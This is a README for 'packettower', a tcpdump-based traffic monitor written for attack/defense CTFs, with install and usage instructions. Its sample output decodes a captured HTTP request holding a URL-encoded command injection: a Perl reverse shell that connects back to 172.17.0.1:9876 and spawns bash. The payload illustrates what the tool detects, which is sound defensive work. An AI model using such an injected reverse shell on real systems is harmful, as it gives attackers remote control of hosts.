# packettower
a tool to listen to and monitor network traffic

_sample output_

```
2022-05-19T19:12:14.639378 - tcp packet from: 172.17.0.1:44526 -> to: 172.17.0.2:80 (URLENCODED-FORM_RAW packet)
[info] payload detected
(raw):
50:4f:53:54:20:2f:76:75:6c:6e:65:72:61:62:69:6c:69:74:69:65:73:2f:65:78:65:63:2f:(...)
(decoded):
POST /vulnerabilities/exec/ HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 367
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/vulnerabilities/exec/
Cookie: PHPSESSID=47kjm8kgbu0ef0jefr7esfukg5; security=low
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
DNT: 1
Sec-GPC: 1

ip=%3B+perl+-e+%27use+Socket%3B%24i%3D%22172.17.0.1%22%3B%24p%3D9876%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22bash+-i%22%29%3B%7D%3B%27&Submit=Submit
-----------------------
```
*note: raw hex dump has been shortened here, full hex dump is written during runtime*

## installation

```bash
$ git clone https://github.com/e-seng/packettower.git
$ pip3 install -r ./packettower/requirements.txt
```

## running it

requires hightened privileges, as this will run `tcpdump` to listen to network
traffic.

packet information parsed by packettower will be written to `stdout`

```bash
Usage: ./packettower.py <interface> [options]
optional args:
| -o /path/to/dump/folder - write to the location to write files
|    note: this will generate a file called packettower_dump-%H-%M-%S-%s.pcap if not specified, no pcap file will be generated.
| -h - displays this help menu
```

eg. `$ sudo ./packettower.py docker0 -o test_dumps`

`./test_dumps` must be a directory that already exists

*written for Attack/Defense CTFs*
